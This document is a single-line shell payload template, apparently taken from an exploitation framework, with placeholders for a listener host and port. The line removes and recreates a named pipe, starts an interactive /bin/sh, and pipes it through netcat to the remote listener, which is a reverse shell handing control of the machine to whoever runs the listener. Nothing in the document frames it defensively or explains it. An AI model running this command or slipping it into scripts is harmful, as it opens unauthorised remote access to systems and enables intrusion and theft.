rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{datastore.lhost}} {{datastore.lport}} >/tmp/f
